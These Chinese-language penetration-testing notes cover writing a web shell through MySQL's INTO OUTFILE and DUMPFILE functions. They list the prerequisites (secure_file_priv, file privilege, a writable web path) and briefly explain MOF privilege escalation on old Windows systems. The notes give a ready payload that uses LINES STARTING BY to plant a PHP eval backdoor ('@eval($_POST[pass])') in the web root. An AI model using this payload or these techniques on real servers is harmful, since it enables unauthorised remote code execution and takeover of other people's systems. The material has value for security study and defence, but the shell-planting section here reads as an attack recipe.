Mysql

写马

导出函数写马

主要使用两个函数

  • outfile
  • dumpfile

使用条件

1.secure_file_priv 的值非NULL或者包含可写路径

验证：show global variables like '%secure%';

secure_file_priv值无具体值/为空 = 无限制

secure_file_priv值为NULL = 禁止导入导出

secure_file_priv值为某目录 = 仅允许在该目录下导入导出

版本：
Mysql>=5.5.53 默认为NULL，即默认禁止导入导出
Mysql<5.5.53 默认为空，即默认无限制

2.mysql服务对网站可访问路径有可写权限

验证：未知如何验证

3.mysql连接用户有FILE权限/ROOT用户或ROOT权限

验证：select user,file_priv from mysql.user;

Some tricks

有时候在注入时，联合注入的列数只有一个的时候，可以使用以下方法写入

LINES STARTING BY

选择在写入文件的每行开头加入什么东西

payload:select * from student into outfile "D:/phpstudy_pro/Extensions/MySQL5.5.29/shell2.php" LINES STARTING BY '<?php @ eval($_POST[pass]);?>';

选择写入文件时选择以什么为间隔

提权

MOF提权

原理

利用了C:\Windows\System32\wbem\MOF目录下的nullevt.mof文件

利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行

利用条件

  1. 只使用于windows系统，一般低版本系统才可以用，比如xp、server2003
  2. 对C:\Windows\System32\wbem\MOF目录有读写权限
  3. 可以找到一个可写目录，写入mof文件
